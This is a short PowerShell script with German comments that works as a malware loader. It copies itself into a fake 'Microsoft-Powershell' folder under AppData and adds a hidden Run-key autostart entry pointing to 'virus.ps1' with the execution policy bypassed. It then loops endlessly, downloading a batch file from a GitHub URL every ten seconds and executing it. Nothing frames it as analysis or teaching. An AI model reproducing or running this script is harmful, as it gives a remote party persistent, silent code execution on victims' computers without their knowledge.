# Zielpfad, in den das Repository kopiert wird
$TargetPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft-Powershell"
# Pfad zum Registrierungsschlüssel
$RegKeyPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# Name des Registrierungswerts
$ValueName = "MyStartupScript"
# Daten für den Registrierungswert
$ValueData = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$TargetPath\virus.ps1`""

# Intervall für die Überprüfung in Sekunden (z.B. alle 5 Minuten)
$checkInterval = 10
#Url zu den Github Dateien
$url = "https://raw.githubusercontent.com/Samuitl/New-Test/main/start.bat"
# Überprüfen und Erstellen des Zielpfads
if (-not (Test-Path -Path $TargetPath)) {
    New-Item -Path $TargetPath -ItemType Directory -Force
}
# Kopieren des eigenen Skriptes in das Zielverzeichnis
$ScriptContents = $MyInvocation.MyCommand.ScriptContents
$ScriptContents | Out-File -FilePath "$TargetPath\MyCopy.ps1" -Encoding utf8
# Funktion zum Herunterladen und Ausführen des Files
function DownloadAndExecuteFile {
    # Herunterladen des Files
    Invoke-WebRequest -Uri $url -OutFile "$TargetPath\start.bat" -ErrorAction SilentlyContinue
    # Überprüfen, ob das File erfolgreich heruntergeladen wurde
    if (Test-Path "$TargetPath\start.bat") {
        # Ausführen des heruntergeladenen Files
        & "$TargetPath\start.bat"
    }
}
# Einrichten des Autostart-Eintrags
try {
    Get-ItemProperty -Path $RegKeyPath -Name $valueName -ErrorAction Stop
} catch [System.Management.Automation.ItemNotFoundException] {
    New-Item -Path $RegKeyPath -Force
    New-ItemProperty -Path $RegKeyPath -Name $ValueName -Value $ValueData -Force
} catch {
    New-ItemProperty -Path $RegKeyPath -Name $ValueName -Value $ValueData -Type String -Force
}
# Schleife für die regelmäßige Ausführung
while ($true) {
    DownloadAndExecuteFile
    Start-Sleep -Seconds $checkInterval
}